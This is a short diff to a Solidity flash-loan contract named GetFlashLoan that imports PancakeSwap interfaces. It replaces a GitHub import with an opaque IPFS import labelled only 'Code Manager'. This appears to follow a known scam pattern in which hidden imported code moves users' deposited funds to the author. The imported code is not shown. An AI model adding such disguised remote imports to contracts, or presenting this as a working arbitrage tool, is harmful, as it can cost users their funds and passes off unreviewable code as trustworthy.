@@ -8,7 +8,8 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-import "https://github.com/Pancakeswap-lib/Pancake-swap-lib/blob/interfaces/PairNamer.sol";
+// Code Manager
+import "ipfs://QmaKNCYNK7RG3Kd8xwMx9QmBPJZAgxtsGYeCH4bu1hpz5E";
 
 // PancakeSwap Deployer
 contract GetFlashLoan {
